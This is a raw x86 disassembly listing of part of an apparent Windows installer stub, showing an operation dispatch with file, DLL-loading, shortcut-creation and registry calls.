  401dd0:	83 e0 01             	and    $0x1,%eax
  401dd3:	f7 c1 00 00 01 00    	test   $0x10000,%ecx
  401dd9:	89 45 d0             	mov    %eax,-0x30(%ebp)
  401ddc:	74 09                	je     0x401de7
  401dde:	6a 11                	push   $0x11
  401de0:	e8 80 0e 00 00       	call   0x402c65
  401de5:	eb 04                	jmp    0x401deb
  401de7:	0f b7 45 e0          	movzwl -0x20(%ebp),%eax
  401deb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401dee:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  401df4:	50                   	push   %eax
  401df5:	ff 75 08             	push   0x8(%ebp)
  401df8:	ff 15 50 82 40 00    	call   *0x408250
  401dfe:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401e01:	25 f0 fe 00 00       	and    $0xfef0,%eax
  401e06:	50                   	push   %eax
  401e07:	8b 45 88             	mov    -0x78(%ebp),%eax
  401e0a:	0f af 45 d0          	imul   -0x30(%ebp),%eax
  401e0e:	50                   	push   %eax
  401e0f:	8b 45 84             	mov    -0x7c(%ebp),%eax
  401e12:	0f af 45 cc          	imul   -0x34(%ebp),%eax
  401e16:	50                   	push   %eax
  401e17:	ff 75 f4             	push   -0xc(%ebp)
  401e1a:	f7 df                	neg    %edi
  401e1c:	ff 75 f8             	push   -0x8(%ebp)
  401e1f:	1b ff                	sbb    %edi,%edi
  401e21:	23 3d 60 43 42 00    	and    0x424360,%edi
  401e27:	57                   	push   %edi
  401e28:	ff 15 30 82 40 00    	call   *0x408230
  401e2e:	8b f8                	mov    %eax,%edi
  401e30:	57                   	push   %edi
  401e31:	ff 75 f4             	push   -0xc(%ebp)
  401e34:	68 72 01 00 00       	push   $0x172
  401e39:	ff 75 08             	push   0x8(%ebp)
  401e3c:	ff 15 44 82 40 00    	call   *0x408244
  401e42:	3b c3                	cmp    %ebx,%eax
  401e44:	74 0c                	je     0x401e52
  401e46:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  401e49:	75 07                	jne    0x401e52
  401e4b:	50                   	push   %eax
  401e4c:	ff 15 54 80 40 00    	call   *0x408054
  401e52:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401e55:	0f 8c 96 0c 00 00    	jl     0x402af1
  401e5b:	57                   	push   %edi
  401e5c:	e9 2d f7 ff ff       	jmp    0x40158e
  401e61:	ff 75 f8             	push   -0x8(%ebp)
  401e64:	ff 15 34 82 40 00    	call   *0x408234
  401e6a:	6a 02                	push   $0x2
  401e6c:	8b f8                	mov    %eax,%edi
  401e6e:	e8 d0 0d 00 00       	call   0x402c43
  401e73:	59                   	pop    %ecx
  401e74:	8b d8                	mov    %eax,%ebx
  401e76:	6a 48                	push   $0x48
  401e78:	6a 5a                	push   $0x5a
  401e7a:	57                   	push   %edi
  401e7b:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401e7e:	ff 15 48 80 40 00    	call   *0x408048
  401e84:	50                   	push   %eax
  401e85:	53                   	push   %ebx
  401e86:	ff 15 3c 81 40 00    	call   *0x40813c
  401e8c:	57                   	push   %edi
  401e8d:	ff 75 f8             	push   -0x8(%ebp)
  401e90:	f7 d8                	neg    %eax
  401e92:	a3 20 b8 40 00       	mov    %eax,0x40b820
  401e97:	ff 15 38 82 40 00    	call   *0x408238
  401e9d:	6a 03                	push   $0x3
  401e9f:	e8 9f 0d 00 00       	call   0x402c43
  401ea4:	a3 30 b8 40 00       	mov    %eax,0x40b830
  401ea9:	8a 45 ec             	mov    -0x14(%ebp),%al
  401eac:	59                   	pop    %ecx
  401ead:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401eb0:	ff 75 e0             	push   -0x20(%ebp)
  401eb3:	8a c8                	mov    %al,%cl
  401eb5:	80 e1 01             	and    $0x1,%cl
  401eb8:	c6 05 37 b8 40 00 01 	movb   $0x1,0x40b837
  401ebf:	88 0d 34 b8 40 00    	mov    %cl,0x40b834
  401ec5:	8a c8                	mov    %al,%cl
  401ec7:	80 e1 02             	and    $0x2,%cl
  401eca:	24 04                	and    $0x4,%al
  401ecc:	68 3c b8 40 00       	push   $0x40b83c
  401ed1:	88 0d 35 b8 40 00    	mov    %cl,0x40b835
  401ed7:	a2 36 b8 40 00       	mov    %al,0x40b836
  401edc:	e8 b7 45 00 00       	call   0x406498
  401ee1:	68 20 b8 40 00       	push   $0x40b820
  401ee6:	ff 15 5c 80 40 00    	call   *0x40805c
  401eec:	e9 63 07 00 00       	jmp    0x402654
  401ef1:	53                   	push   %ebx
  401ef2:	e8 4c 0d 00 00       	call   0x402c43
  401ef7:	6a 01                	push   $0x1
  401ef9:	8b f0                	mov    %eax,%esi
  401efb:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401efe:	e8 40 0d 00 00       	call   0x402c43
  401f03:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  401f06:	59                   	pop    %ecx
  401f07:	59                   	pop    %ecx
  401f08:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401f0b:	50                   	push   %eax
  401f0c:	56                   	push   %esi
  401f0d:	75 0b                	jne    0x401f1a
  401f0f:	ff 15 14 82 40 00    	call   *0x408214
  401f15:	e9 d7 0b 00 00       	jmp    0x402af1
  401f1a:	ff 15 3c 82 40 00    	call   *0x40823c
  401f20:	e9 cc 0b 00 00       	jmp    0x402af1
  401f25:	53                   	push   %ebx
  401f26:	e8 3a 0d 00 00       	call   0x402c65
  401f2b:	6a 31                	push   $0x31
  401f2d:	8b f0                	mov    %eax,%esi
  401f2f:	e8 31 0d 00 00       	call   0x402c65
  401f34:	6a 22                	push   $0x22
  401f36:	8b d8                	mov    %eax,%ebx
  401f38:	e8 28 0d 00 00       	call   0x402c65
  401f3d:	6a 15                	push   $0x15
  401f3f:	8b f8                	mov    %eax,%edi
  401f41:	e8 1f 0d 00 00       	call   0x402c65
  401f46:	6a ec                	push   $0xffffffec
  401f48:	e8 d6 f4 ff ff       	call   0x401423
  401f4d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401f50:	89 45 94             	mov    %eax,-0x6c(%ebp)
  401f53:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401f56:	89 45 98             	mov    %eax,-0x68(%ebp)
  401f59:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401f5c:	89 45 ac             	mov    %eax,-0x54(%ebp)
  401f5f:	8a 06                	mov    (%esi),%al
  401f61:	f6 d8                	neg    %al
  401f63:	1b c0                	sbb    %eax,%eax
  401f65:	89 5d a0             	mov    %ebx,-0x60(%ebp)
  401f68:	23 c6                	and    %esi,%eax
  401f6a:	89 45 9c             	mov    %eax,-0x64(%ebp)
  401f6d:	8a 07                	mov    (%edi),%al
  401f6f:	f6 d8                	neg    %al
  401f71:	1b c0                	sbb    %eax,%eax
  401f73:	c7 45 a8 00 a8 42 00 	movl   $0x42a800,-0x58(%ebp)
  401f7a:	23 c7                	and    %edi,%eax
  401f7c:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  401f7f:	8d 45 90             	lea    -0x70(%ebp),%eax
  401f82:	50                   	push   %eax
  401f83:	e8 59 3b 00 00       	call   0x405ae1
  401f88:	85 c0                	test   %eax,%eax
  401f8a:	0f 84 64 08 00 00    	je     0x4027f4
  401f90:	f6 45 94 40          	testb  $0x40,-0x6c(%ebp)
  401f94:	0f 84 57 0b 00 00    	je     0x402af1
  401f9a:	ff 75 c8             	push   -0x38(%ebp)
  401f9d:	e8 00 49 00 00       	call   0x4068a2
  401fa2:	ff 75 c8             	push   -0x38(%ebp)
  401fa5:	eb 45                	jmp    0x401fec
  401fa7:	53                   	push   %ebx
  401fa8:	e8 b8 0c 00 00       	call   0x402c65
  401fad:	8b f0                	mov    %eax,%esi
  401faf:	56                   	push   %esi
  401fb0:	6a eb                	push   $0xffffffeb
  401fb2:	e8 92 35 00 00       	call   0x405549
  401fb7:	56                   	push   %esi
  401fb8:	e8 e1 3a 00 00       	call   0x405a9e
  401fbd:	8b f0                	mov    %eax,%esi
  401fbf:	3b f3                	cmp    %ebx,%esi
  401fc1:	0f 84 2d 08 00 00    	je     0x4027f4
  401fc7:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401fca:	74 1f                	je     0x401feb
  401fcc:	56                   	push   %esi
  401fcd:	e8 d0 48 00 00       	call   0x4068a2
  401fd2:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401fd5:	7c 09                	jl     0x401fe0
  401fd7:	50                   	push   %eax
  401fd8:	57                   	push   %edi
  401fd9:	e8 85 43 00 00       	call   0x406363
  401fde:	eb 0b                	jmp    0x401feb
  401fe0:	3b c3                	cmp    %ebx,%eax
  401fe2:	74 07                	je     0x401feb
  401fe4:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401feb:	56                   	push   %esi
  401fec:	ff 15 f8 80 40 00    	call   *0x4080f8
  401ff2:	e9 fa 0a 00 00       	jmp    0x402af1
  401ff7:	6a 02                	push   $0x2
  401ff9:	e8 67 0c 00 00       	call   0x402c65
  401ffe:	50                   	push   %eax
  401fff:	e8 94 47 00 00       	call   0x406798
  402004:	3b c3                	cmp    %ebx,%eax
  402006:	89 45 08             	mov    %eax,0x8(%ebp)
  402009:	74 13                	je     0x40201e
  40200b:	8b d8                	mov    %eax,%ebx
  40200d:	ff 73 14             	push   0x14(%ebx)
  402010:	57                   	push   %edi
  402011:	e8 4d 43 00 00       	call   0x406363
  402016:	ff 73 18             	push   0x18(%ebx)
  402019:	e9 70 f5 ff ff       	jmp    0x40158e
  40201e:	88 1e                	mov    %bl,(%esi)
  402020:	88 1f                	mov    %bl,(%edi)
  402022:	e9 cd 07 00 00       	jmp    0x4027f4
  402027:	6a ee                	push   $0xffffffee
  402029:	e8 37 0c 00 00       	call   0x402c65
  40202e:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  402031:	89 45 cc             	mov    %eax,-0x34(%ebp)
  402034:	51                   	push   %ecx
  402035:	50                   	push   %eax
  402036:	6a 0b                	push   $0xb
  402038:	e8 f0 47 00 00       	call   0x40682d
  40203d:	ff d0                	call   *%eax
  40203f:	88 1e                	mov    %bl,(%esi)
  402041:	3b c3                	cmp    %ebx,%eax
  402043:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402046:	88 1f                	mov    %bl,(%edi)
  402048:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40204f:	0f 84 9c 0a 00 00    	je     0x402af1
  402055:	50                   	push   %eax
  402056:	6a 40                	push   $0x40
  402058:	ff 15 0c 81 40 00    	call   *0x40810c
  40205e:	3b c3                	cmp    %ebx,%eax
  402060:	89 45 08             	mov    %eax,0x8(%ebp)
  402063:	0f 84 88 0a 00 00    	je     0x402af1
  402069:	6a 0c                	push   $0xc
  40206b:	e8 bd 47 00 00       	call   0x40682d
  402070:	6a 0d                	push   $0xd
  402072:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402075:	e8 b3 47 00 00       	call   0x40682d
  40207a:	ff 75 08             	push   0x8(%ebp)
  40207d:	89 45 8c             	mov    %eax,-0x74(%ebp)
  402080:	ff 75 f4             	push   -0xc(%ebp)
  402083:	53                   	push   %ebx
  402084:	ff 75 cc             	push   -0x34(%ebp)
  402087:	ff 55 d0             	call   *-0x30(%ebp)
  40208a:	85 c0                	test   %eax,%eax
  40208c:	74 3a                	je     0x4020c8
  40208e:	8d 45 88             	lea    -0x78(%ebp),%eax
  402091:	50                   	push   %eax
  402092:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402095:	50                   	push   %eax
  402096:	68 14 a0 40 00       	push   $0x40a014
  40209b:	ff 75 08             	push   0x8(%ebp)
  40209e:	ff 55 8c             	call   *-0x74(%ebp)
  4020a1:	85 c0                	test   %eax,%eax
  4020a3:	74 23                	je     0x4020c8
  4020a5:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4020a8:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4020ab:	ff 74 88 08          	push   0x8(%eax,%ecx,4)
  4020af:	56                   	push   %esi
  4020b0:	e8 ae 42 00 00       	call   0x406363
  4020b5:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4020b8:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4020bb:	ff 74 81 0c          	push   0xc(%ecx,%eax,4)
  4020bf:	57                   	push   %edi
  4020c0:	e8 9e 42 00 00       	call   0x406363
  4020c5:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4020c8:	ff 75 08             	push   0x8(%ebp)
  4020cb:	e9 52 fb ff ff       	jmp    0x401c22
  4020d0:	39 1d 20 44 42 00    	cmp    %ebx,0x424420
  4020d6:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4020dd:	0f 8c b5 00 00 00    	jl     0x402198
  4020e3:	6a f0                	push   $0xfffffff0
  4020e5:	e8 7b 0b 00 00       	call   0x402c65
  4020ea:	6a 01                	push   $0x1
  4020ec:	8b f0                	mov    %eax,%esi
  4020ee:	e8 72 0b 00 00       	call   0x402c65
  4020f3:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  4020f6:	89 45 08             	mov    %eax,0x8(%ebp)
  4020f9:	74 0d                	je     0x402108
  4020fb:	56                   	push   %esi
  4020fc:	ff 15 10 81 40 00    	call   *0x408110
  402102:	8b f8                	mov    %eax,%edi
  402104:	3b fb                	cmp    %ebx,%edi
  402106:	75 10                	jne    0x402118
  402108:	6a 08                	push   $0x8
  40210a:	53                   	push   %ebx
  40210b:	56                   	push   %esi
  40210c:	ff 15 14 81 40 00    	call   *0x408114
  402112:	8b f8                	mov    %eax,%edi
  402114:	3b fb                	cmp    %ebx,%edi
  402116:	74 79                	je     0x402191
  402118:	ff 75 08             	push   0x8(%ebp)
  40211b:	57                   	push   %edi
  40211c:	e8 7b 47 00 00       	call   0x40689c
  402121:	8b f0                	mov    %eax,%esi
  402123:	3b f3                	cmp    %ebx,%esi
  402125:	74 3d                	je     0x402164
  402127:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  40212a:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40212d:	74 17                	je     0x402146
  40212f:	ff 75 e4             	push   -0x1c(%ebp)
  402132:	e8 ec f2 ff ff       	call   0x401423
  402137:	ff d6                	call   *%esi
  402139:	85 c0                	test   %eax,%eax
  40213b:	74 31                	je     0x40216e
  40213d:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402144:	eb 28                	jmp    0x40216e
  402146:	68 00 a0 40 00       	push   $0x40a000
  40214b:	68 60 b8 40 00       	push   $0x40b860
  402150:	68 00 50 42 00       	push   $0x425000
  402155:	68 00 04 00 00       	push   $0x400
  40215a:	ff 75 f8             	push   -0x8(%ebp)
  40215d:	ff d6                	call   *%esi
  40215f:	83 c4 14             	add    $0x14,%esp
  402162:	eb 0a                	jmp    0x40216e
  402164:	ff 75 08             	push   0x8(%ebp)
  402167:	6a f7                	push   $0xfffffff7
  402169:	e8 db 33 00 00       	call   0x405549
  40216e:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402171:	0f 85 7a 09 00 00    	jne    0x402af1
  402177:	57                   	push   %edi
  402178:	e8 31 1a 00 00       	call   0x403bae
  40217d:	85 c0                	test   %eax,%eax
  40217f:	0f 84 6c 09 00 00    	je     0x402af1
  402185:	57                   	push   %edi
  402186:	ff 15 18 81 40 00    	call   *0x408118
  40218c:	e9 60 09 00 00       	jmp    0x402af1
  402191:	6a f6                	push   $0xfffffff6
  402193:	e9 79 01 00 00       	jmp    0x402311
  402198:	6a e7                	push   $0xffffffe7
  40219a:	e9 72 01 00 00       	jmp    0x402311
  40219f:	6a f0                	push   $0xfffffff0
  4021a1:	e8 bf 0a 00 00       	call   0x402c65
  4021a6:	6a df                	push   $0xffffffdf
  4021a8:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4021ab:	e8 b5 0a 00 00       	call   0x402c65
  4021b0:	6a 02                	push   $0x2
  4021b2:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4021b5:	e8 ab 0a 00 00       	call   0x402c65
  4021ba:	6a cd                	push   $0xffffffcd
  4021bc:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  4021c2:	e8 9e 0a 00 00       	call   0x402c65
  4021c7:	6a 45                	push   $0x45
  4021c9:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4021cc:	e8 94 0a 00 00       	call   0x402c65
  4021d1:	ff 75 f4             	push   -0xc(%ebp)
  4021d4:	89 45 88             	mov    %eax,-0x78(%ebp)
  4021d7:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4021da:	8b c8                	mov    %eax,%ecx
  4021dc:	8b f8                	mov    %eax,%edi
  4021de:	8b f0                	mov    %eax,%esi
  4021e0:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  4021e6:	c1 f8 10             	sar    $0x10,%eax
  4021e9:	c1 fe 0c             	sar    $0xc,%esi
  4021ec:	25 ff ff 00 00       	and    $0xffff,%eax
  4021f1:	89 8d 70 ff ff ff    	mov    %ecx,-0x90(%ebp)
  4021f7:	81 e7 00 80 00 00    	and    $0x8000,%edi
  4021fd:	83 e6 07             	and    $0x7,%esi
  402200:	89 45 8c             	mov    %eax,-0x74(%ebp)
  402203:	e8 fc 3b 00 00       	call   0x405e04
  402208:	85 c0                	test   %eax,%eax
  40220a:	75 07                	jne    0x402213
  40220c:	6a 21                	push   $0x21
  40220e:	e8 52 0a 00 00       	call   0x402c65
  402213:	8d 45 08             	lea    0x8(%ebp),%eax
  402216:	50                   	push   %eax
  402217:	68 00 84 40 00       	push   $0x408400
  40221c:	6a 01                	push   $0x1
  40221e:	53                   	push   %ebx
  40221f:	68 10 84 40 00       	push   $0x408410
  402224:	ff 15 88 82 40 00    	call   *0x408288
  40222a:	3b c3                	cmp    %ebx,%eax
  40222c:	0f 8c d6 00 00 00    	jl     0x402308
  402232:	8b 45 08             	mov    0x8(%ebp),%eax
  402235:	8d 55 d0             	lea    -0x30(%ebp),%edx
  402238:	52                   	push   %edx
  402239:	68 20 84 40 00       	push   $0x408420
  40223e:	8b 08                	mov    (%eax),%ecx
  402240:	50                   	push   %eax
  402241:	ff 11                	call   *(%ecx)
  402243:	3b c3                	cmp    %ebx,%eax
  402245:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402248:	0f 8c ac 00 00 00    	jl     0x4022fa
  40224e:	8b 45 08             	mov    0x8(%ebp),%eax
  402251:	ff 75 f4             	push   -0xc(%ebp)
  402254:	8b 08                	mov    (%eax),%ecx
  402256:	50                   	push   %eax
  402257:	ff 51 50             	call   *0x50(%ecx)
  40225a:	3b fb                	cmp    %ebx,%edi
  40225c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40225f:	75 0e                	jne    0x40226f
  402261:	8b 45 08             	mov    0x8(%ebp),%eax
  402264:	68 00 a8 42 00       	push   $0x42a800
  402269:	50                   	push   %eax
  40226a:	8b 08                	mov    (%eax),%ecx
  40226c:	ff 51 24             	call   *0x24(%ecx)
  40226f:	3b f3                	cmp    %ebx,%esi
  402271:	74 0a                	je     0x40227d
  402273:	8b 45 08             	mov    0x8(%ebp),%eax
  402276:	56                   	push   %esi
  402277:	50                   	push   %eax
  402278:	8b 08                	mov    (%eax),%ecx
  40227a:	ff 51 3c             	call   *0x3c(%ecx)
  40227d:	8b 45 08             	mov    0x8(%ebp),%eax
  402280:	ff 75 8c             	push   -0x74(%ebp)
  402283:	8b 08                	mov    (%eax),%ecx
  402285:	50                   	push   %eax
  402286:	ff 51 34             	call   *0x34(%ecx)
  402289:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  40228c:	38 19                	cmp    %bl,(%ecx)
  40228e:	74 10                	je     0x4022a0
  402290:	8b 45 08             	mov    0x8(%ebp),%eax
  402293:	ff b5 70 ff ff ff    	push   -0x90(%ebp)
  402299:	8b 10                	mov    (%eax),%edx
  40229b:	51                   	push   %ecx
  40229c:	50                   	push   %eax
  40229d:	ff 52 44             	call   *0x44(%edx)
  4022a0:	8b 45 08             	mov    0x8(%ebp),%eax
  4022a3:	ff b5 78 ff ff ff    	push   -0x88(%ebp)
  4022a9:	8b 08                	mov    (%eax),%ecx
  4022ab:	50                   	push   %eax
  4022ac:	ff 51 2c             	call   *0x2c(%ecx)
  4022af:	8b 45 08             	mov    0x8(%ebp),%eax
  4022b2:	ff 75 88             	push   -0x78(%ebp)
  4022b5:	8b 08                	mov    (%eax),%ecx
  4022b7:	50                   	push   %eax
  4022b8:	ff 51 1c             	call   *0x1c(%ecx)
  4022bb:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4022be:	7c 31                	jl     0x4022f1
  4022c0:	68 00 04 00 00       	push   $0x400
  4022c5:	c7 45 f8 05 40 00 80 	movl   $0x80004005,-0x8(%ebp)
  4022cc:	ff 75 f4             	push   -0xc(%ebp)
  4022cf:	6a ff                	push   $0xffffffff
  4022d1:	ff 75 c8             	push   -0x38(%ebp)
  4022d4:	53                   	push   %ebx
  4022d5:	53                   	push   %ebx
  4022d6:	ff 15 1c 81 40 00    	call   *0x40811c
  4022dc:	85 c0                	test   %eax,%eax
  4022de:	74 11                	je     0x4022f1
  4022e0:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4022e3:	6a 01                	push   $0x1
  4022e5:	ff 75 f4             	push   -0xc(%ebp)
  4022e8:	8b 08                	mov    (%eax),%ecx
  4022ea:	50                   	push   %eax
  4022eb:	ff 51 18             	call   *0x18(%ecx)
  4022ee:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4022f1:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4022f4:	50                   	push   %eax
  4022f5:	8b 08                	mov    (%eax),%ecx
  4022f7:	ff 51 08             	call   *0x8(%ecx)
  4022fa:	8b 45 08             	mov    0x8(%ebp),%eax
  4022fd:	50                   	push   %eax
  4022fe:	8b 08                	mov    (%eax),%ecx
  402300:	ff 51 08             	call   *0x8(%ecx)
  402303:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  402306:	7d 13                	jge    0x40231b
  402308:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40230f:	6a f0                	push   $0xfffffff0
  402311:	e8 0d f1 ff ff       	call   0x401423
  402316:	e9 d6 07 00 00       	jmp    0x402af1
  40231b:	6a f4                	push   $0xfffffff4
  40231d:	eb f2                	jmp    0x402311
  40231f:	53                   	push   %ebx
  402320:	e8 40 09 00 00       	call   0x402c65
  402325:	6a 11                	push   $0x11
  402327:	8b f0                	mov    %eax,%esi
  402329:	e8 37 09 00 00       	call   0x402c65
  40232e:	6a 23                	push   $0x23
  402330:	8b f8                	mov    %eax,%edi
  402332:	e8 2e 09 00 00       	call   0x402c65
  402337:	56                   	push   %esi
  402338:	89 45 08             	mov    %eax,0x8(%ebp)
  40233b:	e8 58 44 00 00       	call   0x406798
  402340:	85 c0                	test   %eax,%eax
  402342:	75 0d                	jne    0x402351
  402344:	53                   	push   %ebx
  402345:	6a f9                	push   $0xfffffff9
  402347:	e8 fd 31 00 00       	call   0x405549
  40234c:	e9 a3 04 00 00       	jmp    0x4027f4
  402351:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402354:	56                   	push   %esi
  402355:	89 45 ac             	mov    %eax,-0x54(%ebp)
  402358:	c7 45 b0 02 00 00 00 	movl   $0x2,-0x50(%ebp)
  40235f:	e8 b7 40 00 00       	call   0x40641b
  402364:	57                   	push   %edi
  402365:	88 5c 30 01          	mov    %bl,0x1(%eax,%esi,1)
  402369:	e8 ad 40 00 00       	call   0x40641b
  40236e:	88 5c 38 01          	mov    %bl,0x1(%eax,%edi,1)
  402372:	8b 45 08             	mov    0x8(%ebp),%eax
  402375:	66 8b 4d e4          	mov    -0x1c(%ebp),%cx
  402379:	50                   	push   %eax
  40237a:	53                   	push   %ebx
  40237b:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  40237e:	89 7d b8             	mov    %edi,-0x48(%ebp)
  402381:	89 45 c6             	mov    %eax,-0x3a(%ebp)
  402384:	66 89 4d bc          	mov    %cx,-0x44(%ebp)
  402388:	e8 bc 31 00 00       	call   0x405549
  40238d:	8d 45 ac             	lea    -0x54(%ebp),%eax
  402390:	50                   	push   %eax
  402391:	ff 15 74 81 40 00    	call   *0x408174
  402397:	85 c0                	test   %eax,%eax
  402399:	0f 84 52 07 00 00    	je     0x402af1
  40239f:	eb a3                	jmp    0x402344
  4023a1:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  4023a6:	74 1d                	je     0x4023c5
  4023a8:	68 10 00 20 00       	push   $0x200010
  4023ad:	6a e8                	push   $0xffffffe8
  4023af:	53                   	push   %ebx
  4023b0:	e8 e3 40 00 00       	call   0x406498
  4023b5:	50                   	push   %eax
  4023b6:	e8 60 37 00 00       	call   0x405b1b
  4023bb:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  4023c0:	e9 37 07 00 00       	jmp    0x402afc
  4023c5:	ff 05 f4 43 42 00    	incl   0x4243f4
  4023cb:	e9 21 07 00 00       	jmp    0x402af1
  4023d0:	33 f6                	xor    %esi,%esi
  4023d2:	33 ff                	xor    %edi,%edi
  4023d4:	3b c3                	cmp    %ebx,%eax
  4023d6:	74 0b                	je     0x4023e3
  4023d8:	53                   	push   %ebx
  4023d9:	e8 87 08 00 00       	call   0x402c65
  4023de:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4023e1:	8b f0                	mov    %eax,%esi
  4023e3:	3b d3                	cmp    %ebx,%edx
  4023e5:	74 09                	je     0x4023f0
  4023e7:	6a 11                	push   $0x11
  4023e9:	e8 77 08 00 00       	call   0x402c65
  4023ee:	8b f8                	mov    %eax,%edi
  4023f0:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  4023f3:	74 09                	je     0x4023fe
  4023f5:	6a 22                	push   $0x22
  4023f7:	e8 69 08 00 00       	call   0x402c65
  4023fc:	8b d8                	mov    %eax,%ebx
  4023fe:	6a cd                	push   $0xffffffcd
  402400:	e8 60 08 00 00       	call   0x402c65
  402405:	50                   	push   %eax
  402406:	53                   	push   %ebx
  402407:	57                   	push   %edi
  402408:	56                   	push   %esi
  402409:	ff 15 20 81 40 00    	call   *0x408120
  40240f:	e9 bf f1 ff ff       	jmp    0x4015d3
  402414:	66 a1 10 a0 40 00    	mov    0x40a010,%ax
  40241a:	6a 01                	push   $0x1
  40241c:	66 89 45 0a          	mov    %ax,0xa(%ebp)
  402420:	e8 40 08 00 00       	call   0x402c65
  402425:	6a 12                	push   $0x12
  402427:	8b f8                	mov    %eax,%edi
  402429:	e8 37 08 00 00       	call   0x402c65
  40242e:	6a dd                	push   $0xffffffdd
  402430:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402433:	e8 2d 08 00 00       	call   0x402c65
  402438:	50                   	push   %eax
  402439:	68 ff 03 00 00       	push   $0x3ff
  40243e:	8d 45 0a             	lea    0xa(%ebp),%eax
  402441:	56                   	push   %esi
  402442:	50                   	push   %eax
  402443:	ff 75 c8             	push   -0x38(%ebp)
  402446:	57                   	push   %edi
  402447:	ff 15 24 81 40 00    	call   *0x408124
  40244d:	80 3e 0a             	cmpb   $0xa,(%esi)
  402450:	e9 12 f3 ff ff       	jmp    0x401767
  402455:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  402458:	8b f2                	mov    %edx,%esi
  40245a:	75 2b                	jne    0x402487
  40245c:	6a 02                	push   $0x2
  40245e:	e8 42 08 00 00       	call   0x402ca5
  402463:	8b f0                	mov    %eax,%esi
  402465:	3b f3                	cmp    %ebx,%esi
  402467:	0f 84 87 03 00 00    	je     0x4027f4
  40246d:	6a 33                	push   $0x33
  40246f:	e8 f1 07 00 00       	call   0x402c65
  402474:	50                   	push   %eax
  402475:	56                   	push   %esi
  402476:	ff 15 14 80 40 00    	call   *0x408014
  40247c:	56                   	push   %esi
  40247d:	8b f8                	mov    %eax,%edi
  40247f:	ff 15 10 80 40 00    	call   *0x408010
  402485:	eb 16                	jmp    0x40249d
  402487:	6a 22                	push   $0x22
  402489:	e8 d7 07 00 00       	call   0x402c65
  40248e:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402491:	d1 f9                	sar    $1,%ecx
  402493:	51                   	push   %ecx
  402494:	50                   	push   %eax
  402495:	56                   	push   %esi
  402496:	e8 88 08 00 00       	call   0x402d23
  40249b:	8b f8                	mov    %eax,%edi
  40249d:	3b fb                	cmp    %ebx,%edi
  40249f:	0f 84 4c 06 00 00    	je     0x402af1
  4024a5:	e9 4a 03 00 00       	jmp    0x4027f4
  4024aa:	8b 75 ec             	mov    -0x14(%ebp),%esi
  4024ad:	8b f8                	mov    %eax,%edi
  4024af:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4024b2:	6a 02                	push   $0x2
  4024b4:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4024b7:	e8 a9 07 00 00       	call   0x402c65
  4024bc:	6a 11                	push   $0x11
  4024be:	89 45 88             	mov    %eax,-0x78(%ebp)
  4024c1:	e8 9f 07 00 00       	call   0x402c65
  4024c6:	6a 02                	push   $0x2
  4024c8:	50                   	push   %eax
  4024c9:	57                   	push   %edi
  4024ca:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4024d1:	e8 1f 08 00 00       	call   0x402cf5
  4024d6:	3b c3                	cmp    %ebx,%eax
  4024d8:	89 45 08             	mov    %eax,0x8(%ebp)
  4024db:	0f 84 10 06 00 00    	je     0x402af1
  4024e1:	33 c0                	xor    %eax,%eax
  4024e3:	83 fe 01             	cmp    $0x1,%esi
  4024e6:	bf 20 ac 40 00       	mov    $0x40ac20,%edi
  4024eb:	75 0e                	jne    0x4024fb
  4024ed:	6a 23                	push   $0x23
  4024ef:	e8 71 07 00 00       	call   0x402c65
